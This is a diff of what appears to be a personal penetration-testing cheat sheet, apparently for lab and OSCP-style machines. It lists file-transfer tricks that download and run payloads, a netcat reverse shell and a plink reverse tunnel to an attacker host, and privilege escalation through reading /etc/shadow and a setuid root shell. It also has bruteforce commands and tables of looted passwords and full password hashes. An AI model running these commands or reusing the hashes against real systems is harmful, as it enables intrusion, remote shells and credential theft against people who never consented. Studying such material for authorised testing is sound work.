+  C:\Windows\d.vbs "http://<targetip>/nc.exe" C:\Windows\nc.exe
+
 netcat:
-nc -w3 <targetip> 1234 <file.sent
-cmd /c nc.exe -l -v -p 1234 >file.rcvd
+  nc -w3 <targetip> 1234 <file.sent
+  cmd /c nc.exe -l -v -p 1234 >file.rcvd
+
 smb (139/tcp, 445/tcp):
-server: python smbserver.py -smb2support shared $HOME/toolbox/scripts/shared
-  copy ntlm/lm hashes submitted by windows clients during transfers and crack via jtr/hashcat
-client:
-  list files: smbclient -L <targetip> --no-pass
-  list files: net view \\<targetip>
-  list files: dir \\<targetip>\shared
-  copy files: copy \\<targetip>\shared\met8888.exe
-  execute files: \\<targetip>\shared\met8888.exe
+  server: python smbserver.py -smb2support shared $HOME/toolbox/scripts/shared
+    copy ntlm/lm hashes submitted by windows clients during transfers and crack via jtr/hashcat
+  client:
+    list files: smbclient -L <targetip> --no-pass
+    list files: net view \\<targetip>
+    list files: dir \\<targetip>\shared
+    copy files: copy \\<targetip>\shared\met8888.exe
+    execute files: \\<targetip>\shared\met8888.exe
+
 tftp (69/udp):
-server:
-  atftpd --daemon --port 69 $HOME/toolbox/scripts/shared
-  metasploit:
-    use auxiliary/server/tftp
-    set TFTPROOT $HOME/toolbox/scripts/shared
-    exploit
-client:
-  download: tftp -i <targetip> GET met8888.exe
-  upload: tftp -i <targetip> PUT hashes.txt
-  install: pkgmgr /iu:"TFTP"
+  server:
+    atftpd --daemon --port 69 $HOME/toolbox/scripts/shared
+    metasploit:
+      use auxiliary/server/tftp
+      set TFTPROOT $HOME/toolbox/scripts/shared
+      exploit
+  client:
+    download: tftp -i <targetip> GET met8888.exe
+    upload: tftp -i <targetip> PUT hashes.txt
+    install: pkgmgr /iu:"TFTP"
 ```  
 ### heartbleed [🡑](#tips)  
 ```
@@ -2372,6 +2450,8 @@ windows - add user:
 ```
 socat tcp-listen:8080,fork,reuseaddr tcp:127.0.0.1:80 &
 socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
+
+plink.exe -v -x -a -T -C -noagent -ssh -pw "<localpassword>" -R <targetport>:127.0.0.1:<targetport> <localuser>@<attackerip>
 ```  
 ### portknock [🡑](#tips)  
 ```
@@ -2433,38 +2513,38 @@ linux:
     https://www.exploit-db.com/exploits/5092
   service:
     manual:
-    find services running as root:
-      $ ps aux | grep "^root"
-    find program version:
-      $ <program> --version
-      $ <program> -v
-      $ dpkg -l | grep <program>
-      $ rpm -qa | grep <program>
+      find services running as root:
+        $ ps aux | grep "^root"
+      find program version:
+        $ <program> --version
+        $ <program> -v
+        $ dpkg -l | grep <program>
+        $ rpm -qa | grep <program>
     apache2:
-    sudo -l => shows apache2 can be run as sudo
-    sudo apache2 -f /etc/shadow => will throw an error upon reading the first line of shadow file and dump hash on stdout, copy it to a file
-    john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst hash
+      sudo -l => shows apache2 can be run as sudo
+      sudo apache2 -f /etc/shadow => will throw an error upon reading the first line of shadow file and dump hash on stdout, copy it to a file
+      john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst hash
     exim:
-    dpkg -l | grep -i exim => version <4.86.2
-    exim -bV -v | grep -i perl => compiled with perl support
-    head /etc/exim.conf => configuration has perl_startup option
-    ./cve_2016-1521.sh
+      dpkg -l | grep -i exim => version <4.86.2
+      exim -bV -v | grep -i perl => compiled with perl support
+      head /etc/exim.conf => configuration has perl_startup option
+      ./cve_2016-1521.sh
     lxd:
-    check output of id command
-    if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+      check output of id command
+      if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
     mysqld:
-    when mysql is running as root
-    mysql has ability to install uder defined functions which run via shared objects
-    use [edb:1518](https://www.exploit-db.com/exploits/1518)
-    once exploit is complete, do the following:
-      mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
-      mysql> exit
-      $ /tmp/rootbash -p
-      rootbash-4.1# id
-        uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+      when mysql is running as root
+      mysql has ability to install uder defined functions which run via shared objects
+      use [edb:1518](https://www.exploit-db.com/exploits/1518)
+      once exploit is complete, do the following:
+        mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
+        mysql> exit
+        $ /tmp/rootbash -p
+        rootbash-4.1# id
+          uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
     strace:
-    https://gtfobins.github.io/gtfobins/strace/
-    write a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/
+      https://gtfobins.github.io/gtfobins/strace/
+      write a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/
     udev:
     netlink:
         https://www.exploit-db.com/exploits/8478
@@ -2472,8 +2552,8 @@ linux:
         cat /proc/net/netlink
         select pid for group "ffffffff"
     port forwarding:
-    if the root process is bound to an internal port and for some reason we cannot run the exploit locally, use port forwarding via ssh:
-    $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
+      if the root process is bound to an internal port and for some reason we cannot run the exploit locally, use port forwarding via ssh:
+      $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
   weak file permissions:
     important commands:
     $ find /etc -maxdepth 1 -writable -type f
@@ -3006,7 +3086,7 @@ nc -e /bin/bash <targetip> <attackerport>
 ### ncrack [🡑](#tools)  
 ```
 bruteforce rdp login:
-ncrack -vv --user administrator -P passwords.txt rdp://<targetip>
+  ncrack -vv --user administrator -P passwords.txt rdp://<targetip>
 ```  
 ### netdiscover [🡑](#tools)  
 ```
@@ -3020,22 +3100,22 @@ nikto -h 192.168.92.146 -useproxy http://192.168.92.146:3128
 ### nmap [🡑](#tools)  
 ```
 vulners nse script:
-https://github.com/vulnersCom/nmap-vulners
+  https://github.com/vulnersCom/nmap-vulners
 searchsploit-like vuln scan:
-nmap --script vulners --script-args mincvss=5.0 <targetip>
+  nmap --script vulners --script-args mincvss=5.0 <targetip>
 ping sweep:
-nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap | grep Up | cut -d" " -f2
+  nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap | grep Up | cut -d" " -f2
 quick tcp:
-nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap <targetip>
+  nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap <targetip>
 quick udp:
-nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>
+  nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>
 full/intensive tcp:
-nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
+  nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
 full/intensive udp:
-nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
+  nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
 smb bruteforce:
-nmap --script=smb-brute.nse <targetip>
-nmap -sV -p 445 --script smb-brute <targetiprange>
+  nmap --script=smb-brute.nse <targetip>
+  nmap -sV -p 445 --script smb-brute <targetiprange>
 ```  
 ### openssl [🡑](#tools)  
 ```
@@ -3090,19 +3170,19 @@ unicornscan -vmU <targetip>
 ### wfuzz [🡑](#tools)  
 ```
 enumerate directories:
-wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://127.0.0.1/index.php?vuln=../FUZZ/file1.php"
-wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
-wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZ
+  wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://127.0.0.1/index.php?vuln=../FUZZ/file1.php"
+  wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
+  wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZ
 enumerate directories and filter on response length:
-wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
+  wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
 bruteforce password:
-bruteforce a single list:
-  wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
-bruteforce multiple lists:
-  wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
-bruteforce multiple lists, but faster:
-  wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php
-  wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php
+  bruteforce a single list:
+    wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+  bruteforce multiple lists:
+    wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+  bruteforce multiple lists, but faster:
+    wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php
+    wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php
 ```  
 
 
@@ -3126,58 +3206,60 @@ bruteforce multiple lists, but faster:
 | 12. | `wpdbuser` | `meErKa..` | `mysql` |
 | 13. | `mysql` | `mysql@12...` | `mysql` |
 | 14. | `admin` | `3298fj8323j80d....` | `mysql` |
-| 15. | `john` | `hiroshi..` | `mysql` |
-| 16. | `root` | `fuckey..` | `mysql` |
-| 17. | `Admin` | `TogieMYSQL123....` | `mysql` |
-| 18. | `root` | `darkshad..` | `mysql` |
-| 19. | `sql_svc` | `M3g4c0rp...` | `sql` |
-| 20. | `administrator` | `MEGACORP_4dm....` | `ssh` |
-| 21. | `notch` | `8YsqfCTnvxAUeduzjN.....` | `ssh` |
-| 22. | `pi` | `raspber..` | `ssh` |
-| 23. | `eric` | `triscui..` | `ssh` |
-| 24. | `anne` | `prince..` | `ssh` |
-| 25. | `graham` | `GSo7isUM...` | `ssh` |
-| 26. | `root` | `1234.` | `ssh` |
-| 27. | `admin` | `thisisalsopw...` | `ssh` |
-| 28. | `fristigod` | `LetThereBeFri....` | `ssh` |
-| 29. | `dreg` | `Mast..` | `ssh` |
-| 30. | `loneferret` | `starwa..` | `ssh` |
-| 31. | `john` | `MyNameIsJ...` | `ssh` |
-| 32. | `robert` | `ADGAdsafdfwt4gadf....` | `ssh` |
-| 33. | `togie` | `1234.` | `ssh` |
-| 34. | `bob` | `secr..` | `ssh` |
-| 35. | `susan` | `MySuperS3cretVa....` | `ssh` |
-| 36. | `insecurity` | `P@ssw0..` | `ssh` |
-| 37. | `smeagol` | `MyPreciousR...` | `ssh` |
-| 38. | `Ori` | `span..` | `ssh` |
-| 39. | `robot` | `abcdefghijklmnopqrstu.....` | `ssh` |
-| 40. | `mark` | `5AYRft73VtFp....` | `ssh` |
-| 41. | `wpadmin` | `wpadm..` | `ssh` |
-| 42. | `root` | `rootpasswo...` | `ssh` |
-| 43. | `user` | `letme..` | `ssh` |
-| 44. | `tomcat` | `submitthisforpo....` | `tomcat` |
-| 45. |  | `execrab..` | `truecrypt` |
-| 46. | `user1` | `hell.` | `webapp` |
-| 47. | `user2` | `comman..` | `webapp` |
-| 48. | `user3` | `p@ssw0..` | `webapp` |
-| 49. | `test` | `testte..` | `webapp` |
-| 50. | `superadmin` | `Uncracka...` | `webapp` |
-| 51. | `test1` | `testte..` | `webapp` |
-| 52. | `admin` | `5afac8d8..` | `webapp` |
-| 53. | `john` | `66lajGGb..` | `webapp` |
-| 54. | `frodo` | `iwilltakethe....` | `webapp` |
-| 55. | `smeagol` | `MyPreciousR...` | `webapp` |
-| 56. | `aragorn` | `AndMySwo..` | `webapp` |
-| 57. | `legolas` | `AndMyB..` | `webapp` |
-| 58. | `gimli` | `AndMyA..` | `webapp` |
-| 59. | `myP14ceAdm1nAcc0uNT` | `manchest..` | `webapp` |
-| 60. | `tom` | `spongeb..` | `webapp` |
-| 61. | `mark` | `snowfla..` | `webapp` |
-| 62. | `john` | `enig..` | `wordpress` |
-| 63. | `mark` | `helpdesk..` | `wordpress` |
-| 64. | `admin` | `TogieMYSQL123....` | `wordpress` |
-| 65. | `elliot` | `ER28-06..` | `wordpress` |
-| 66. | `admin` | `admi.` | `wordpress` |
+| 15. | `wordpress` | `Oscp1234..` | `mysql` |
+| 16. | `john` | `hiroshi..` | `mysql` |
+| 17. | `root` | `fuckey..` | `mysql` |
+| 18. | `Admin` | `TogieMYSQL123....` | `mysql` |
+| 19. | `root` | `darkshad..` | `mysql` |
+| 20. | `sql_svc` | `M3g4c0rp...` | `sql` |
+| 21. | `administrator` | `MEGACORP_4dm....` | `ssh` |
+| 22. | `notch` | `8YsqfCTnvxAUeduzjN.....` | `ssh` |
+| 23. | `pi` | `raspber..` | `ssh` |
+| 24. | `eric` | `triscui..` | `ssh` |
+| 25. | `anne` | `prince..` | `ssh` |
+| 26. | `graham` | `GSo7isUM...` | `ssh` |
+| 27. | `root` | `1234.` | `ssh` |
+| 28. | `admin` | `thisisalsopw...` | `ssh` |
+| 29. | `fristigod` | `LetThereBeFri....` | `ssh` |
+| 30. | `dreg` | `Mast..` | `ssh` |
+| 31. | `loneferret` | `starwa..` | `ssh` |
+| 32. | `john` | `MyNameIsJ...` | `ssh` |
+| 33. | `robert` | `ADGAdsafdfwt4gadf....` | `ssh` |
+| 34. | `togie` | `1234.` | `ssh` |
+| 35. | `bob` | `secr..` | `ssh` |
+| 36. | `susan` | `MySuperS3cretVa....` | `ssh` |
+| 37. | `insecurity` | `P@ssw0..` | `ssh` |
+| 38. | `smeagol` | `MyPreciousR...` | `ssh` |
+| 39. | `Ori` | `span..` | `ssh` |
+| 40. | `robot` | `abcdefghijklmnopqrstu.....` | `ssh` |
+| 41. | `mark` | `5AYRft73VtFp....` | `ssh` |
+| 42. | `wpadmin` | `wpadm..` | `ssh` |
+| 43. | `root` | `rootpasswo...` | `ssh` |
+| 44. | `user` | `letme..` | `ssh` |
+| 45. | `tomcat` | `submitthisforpo....` | `tomcat` |
+| 46. |  | `execrab..` | `truecrypt` |
+| 47. | `user1` | `hell.` | `webapp` |
+| 48. | `user2` | `comman..` | `webapp` |
+| 49. | `user3` | `p@ssw0..` | `webapp` |
+| 50. | `test` | `testte..` | `webapp` |
+| 51. | `superadmin` | `Uncracka...` | `webapp` |
+| 52. | `test1` | `testte..` | `webapp` |
+| 53. | `admin` | `5afac8d8..` | `webapp` |
+| 54. | `john` | `66lajGGb..` | `webapp` |
+| 55. | `frodo` | `iwilltakethe....` | `webapp` |
+| 56. | `smeagol` | `MyPreciousR...` | `webapp` |
+| 57. | `aragorn` | `AndMySwo..` | `webapp` |
+| 58. | `legolas` | `AndMyB..` | `webapp` |
+| 59. | `gimli` | `AndMyA..` | `webapp` |
+| 60. | `myP14ceAdm1nAcc0uNT` | `manchest..` | `webapp` |
+| 61. | `tom` | `spongeb..` | `webapp` |
+| 62. | `mark` | `snowfla..` | `webapp` |
+| 63. | `john` | `enig..` | `wordpress` |
+| 64. | `mark` | `helpdesk..` | `wordpress` |
+| 65. |  | `admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2........` | `wordpress` |
+| 66. | `admin` | `TogieMYSQL123....` | `wordpress` |
+| 67. | `elliot` | `ER28-06..` | `wordpress` |
+| 68. | `admin` | `admi.` | `wordpress` |
 
 <a name="hashes"></a>
 ### 🔑 Hashes [🡑](#loot)
@@ -3227,56 +3309,58 @@ bruteforce multiple lists, but faster:
 | 42. | `notch:$6$RdxVAN/.$DFugS5p/G9hTNY9htDWVGKte9n9r/nYYL.wVdAHfiHpnyN9dNftf5Nt.DkjrUs0PlYNcYZWhh0Vhl/5tl8WBG1:17349:0:99999:7:::` |
 | 43. | `noulis:$6$ApsLg5.I$Zd9blHPGRHAQOab94HKuQFtJ8m7ob8MFnX6WIIr0Aah6pW/aZ.yA3T1iU13lCSixrh6NG1.GHPl.QbjHSZmg7/:17247:0:99999:7:::` |
 | 44. | `Ori:$6$1zYgjEIM$VQ0gvU7JjenS9WuiVjSeva8pbWnEXjqTmEdFnQRXKmTmXPXmt55/oyup40NiXD8J9GxmXF7DYiaHZDRshrs3f1:17237:0:99999:7:::` |
-| 45. | `peter:$6$QpjS4vUG$Zi1KcJ7cRB8TJG9A/x7GhQQvJ0RoYwG4Jxj/6R58SJddU2X/QTQKNJWzwiByeTELKeyp0vS83kPsYITbTTmlb0:17721:0:99999:7:::` |
-| 46. | `pi:$6$SQPHFoql$gSE5qWbZRGHDin4LnFY56sMnQsmvH/o2oIlXv.3KcqVsJCYgJ09R9/Pws88e8yjKgJnaxN3zdq8f5ots1bJcY/:17148:0:99999:7:::` |
-| 47. | `postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::` |
-| 48. | `puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEmbIcBF9Oi7q2eAi0TMMqOhg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::` |
-| 49. | `reynard:$6$h54J.qxd$yL5md3J4dONwNl.36iA.mkcabQqRMmeZ0VFKxIVpXeNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::` |
-| 50. | `robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::` |
-| 51. | `robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBnTddK/:16752:0:99999:7:::` |
-| 52. | `root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::` |
-| 53. | `root:$1$DdHlo6rh$usiPcDoTR37eL7DAyLjhk1:0:0::0:0:Charlie &:/root:/bin/csh` |
-| 54. | `root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::` |
-| 55. | `root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::` |
-| 56. | `root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::` |
-| 57. | `root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::` |
-| 58. | `root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::` |
-| 59. | `root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::` |
-| 60. | `root:$6$BVgS5ne0$Q6rV3guK7QQUy7uRMwbQ3vv2Y5I9yQUhIzvrIhuiDso/o5UfDxZw7MMq8atR3UdJjhpkFVxVD0cVtjXQdPUAH.:17431:0:99999:7:::` |
-| 61. | `root:$6$CM3c1cdI$HbQWZlQdGEWV8yo3j7M84i1/RFK4G7fafTUIUYLWk52zm9O8KRLhqZenF8KbqsUjHlZQk4VmNEeEbBCRjOWbH0:17111:0:99999:7:::` |
-| 62. | `root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1ML2jH.:16695:0:99999:7:::` |
-| 63. | `root:$6$GpmQGQUN$8kLewzMF4ItmxezcryWqSPrXNRTH5TOQFKKkHjK2NSmrTg95xiYi.l8L.RYUL.8pAsj8s4EGvDy4dvENQIqNf.:15585:0:99999:7:::` |
-| 64. | `root:$6$kdMFceEg$pk9h93tdD7IomhE7L0Y396HO6fxSM.XDh9dgeBhKpdZlM/WYxCZe7yPRNHfZ5FvNRuILVp2NOsqNmgjoSx/IN0:18012:0:99999:7:::` |
-| 65. | `root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5fL6A0:17247:0:99999:7:::` |
-| 66. | `root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdOhg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZaDioh0:15768:0:99999:7:::` |
-| 67. | `root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::` |
-| 68. | `root:$6$n.BA4A59$WeIF0ZbaB3VGgAxUZqGHnw01.GhL9oVYYFioh07RpPtBl49YdMahhtbYhxUjanXf/NJXiCHBvrNhdC53P1UX2.:17412:0:99999:7:::` |
-| 69. | `root:$6$O4bZf1Ju$0xcLPNyQkVcKT0CajZYBOTz4thlujMRjQ7XuFstUDWwYHKmVmJsDmzGXUwYbU1uqr6jxEvX4XJjSUgiwjPmEp0:17399:0:99999:7:::` |
-| 70. | `root:$6$P7ElNgGp$fNzyy4OgqSR1ANJXTgbpzp4U42JXG1qJ55iNV10NVJoX5UWjtckWD0oHmcTOj0lqObyWhFu2y3udHVpHaqYxf.:17238:0:99999:7:::` |
-| 71. | `root:$6$PnbVvEMS$OcseJT8lZRrgrW1JBpHJ252SPRxS6Rkh3oVBkrbRBZgHBD1wArL6FcyO5daqaon7waFKwSqbg5fIjFgzUVFMS1:18048:0:99999:7:::` |
-| 72. | `root:$6$qAoeosiW$fsOy8H/VKux.9K0T3Ww2D3FPNlO5LAaFytx/6t69Q7LPDSS/nNiP4xzq0Qab.Iz3uy5fYdH3Aw/K5v3ZMhRRH0:16756:0:99999:7:::` |
-| 73. | `root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt3mm91:17097:0:99999:7:::` |
-| 74. | `sarah:$6$DoSO7Ycr$2GtM5.8Lfx9Sw8X1fDMF.7zWDoVoy1892nyp0iFsqh5CfmtEROtxmejvQxu0N/8D7X8PQAGKYGl.gUb6/cG210:18010:0:99999:7:::` |
-| 75. | `scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk35Nqd0:17504:0:99999:7:::` |
-| 76. | `service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::` |
-| 77. | `setup:$6$PR5zOqWk$3MKXMgf6.4bLlznh0R87RB4qaOAcGhbE0Cs8xtUqVPHP8x0553/6aMZnfsZOWKXL0DOqUcVRkfCQN8DvjdZNc1:17086:0:99999:7:::` |
-| 78. | `shelly:$6$aYLAoDIC$CJ8f8WSCT6GYmbx7x8z5RfrbTG5mpDkkJkLW097hoiEw3tqei2cE7EcUTYdJTVMSa3PALZeBHjhiFR8Ba5jzf0:17431:0:99999:7:::` |
-| 79. | `smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBpAPvFCPuo73phXmpOoLsg5REXz.:16695:0:99999:7:::` |
-| 80. | `SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::` |
-| 81. | `susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh30Gb32IBp5yZ7XvBR6uX9/SR/:17721:0:99999:7:::` |
-| 82. | `sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::` |
-| 83. | `togie:$6$dvOTOc6x$jpt1MVPeBsVlfkhVXl3sv21x2Ls2qle8ouv/JMdR6yNpt2nHHahrh0cyT.8PfVcNqlrAHYFkK2WYdSbxQ4Ivu1:17392:0:99999:7:::` |
-| 84. | `tom:$6$ptD/.gN.$n.B/5dODEQFteBwg75Ip9leeaaXSMesGbfZzoVHpZihMHfbWu45UpVZTc6razK1JLZ6817ckZhAJF776Dg/ZJ0:17407:0:99999:7:::` |
-| 85. | `user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::` |
-| 86. | `user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::` |
-| 87. | `user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::` |
-| 88. | `user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::` |
-| 89. | `user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::` |
-| 90. | `user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::` |
-| 91. | `user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::` |
-| 92. | `user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::` |
-| 93. | `user:$6$gLVDPSY5$CGHDuEBpkC90vX2xFD9NeJC0O9XfhVj9oFVvL8XbTRpBnt/7WJFpADj0zboPTKTqPbOHafZGUd/exj4OZ1Frc/:15585:0:99999:7:::` |
-| 94. | `veronica:$6$ud4650Og$j9dN4Xh6nHTDUQ5LpnrUzl6FdRiapcGvjg0JU2/Wx.G5Q.PFtbv.sa4OJyNnzTVsFEMmgnEZQV1nxGFiy56zS/:17033:0:99999:7:::` |
-| 95. | `vulnix:$6$tMOyhDF2$gExhASDVWJqHYn00.A8XLJb.DvE7bdD6NffAno3iY5zEkJwZ4yDTGMrhdVbkMXV1dlBT00DoGFR7oXbtDi3lQ0:15585:0:99999:7:::` |
-| 96. | `wpadmin:$6$FtTN/YPC$iidNFmRVpQ1p2kkfoOZ6OzNPqR95DQ/7G10aze2CA2W3ik/sHHyEPaNNY57tMvRDU0/Rs62FEimiKXD2VgEYC1:17096:0:99999:7:::` |
-| 97. | `www-data:$6$SYixzIan$P3cvyztSwA1lmILF3kpKcqZpYSDONYwMwplB62RWu1RklKqIGCX1zleXuVwzxjLcpU6bhiW9N03AWkzVUZhms.:17264:0:99999:7:::` |
+| 45. | `oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmBFu/Sf.:18452:0:99999:7:::` |
+| 46. | `peter:$6$QpjS4vUG$Zi1KcJ7cRB8TJG9A/x7GhQQvJ0RoYwG4Jxj/6R58SJddU2X/QTQKNJWzwiByeTELKeyp0vS83kPsYITbTTmlb0:17721:0:99999:7:::` |
+| 47. | `pi:$6$SQPHFoql$gSE5qWbZRGHDin4LnFY56sMnQsmvH/o2oIlXv.3KcqVsJCYgJ09R9/Pws88e8yjKgJnaxN3zdq8f5ots1bJcY/:17148:0:99999:7:::` |
+| 48. | `postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::` |
+| 49. | `puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEmbIcBF9Oi7q2eAi0TMMqOhg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::` |
